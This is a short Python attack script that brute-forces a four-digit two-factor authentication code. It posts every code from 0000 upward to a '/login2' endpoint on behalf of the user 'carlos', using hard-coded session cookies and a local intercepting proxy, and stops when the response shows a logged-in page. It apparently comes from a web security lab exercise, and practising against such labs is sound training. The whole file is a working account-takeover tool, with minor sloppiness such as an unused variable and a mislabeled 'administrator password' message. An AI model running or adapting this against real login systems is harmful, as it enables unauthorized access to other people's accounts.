import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def brut_forcer(url):
    password_extracted = ""
    for i in range(10001):
            code = f"{i:04d}"
            cookies = {'TrackingId': 'kuPYS40apDH6h41T','session': 'aFc9i2cgVQN3vwxknT5NVMvn8rCnNMAD'}
            data = {'mfa-code': code ,'verify':'carlos'}
            response = requests.post(f"{url}/login2", data=data ,cookies = cookies,verify = False, proxies = proxies)
            if "Your username is: carlos" in response.text or "Log out" in response.text:
                print (f"success! 2fa code:{code}")
                break
            else:
                print(f"tried code: {code}")

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    brut_forcer(url)


if __name__ == "__main__":
    main()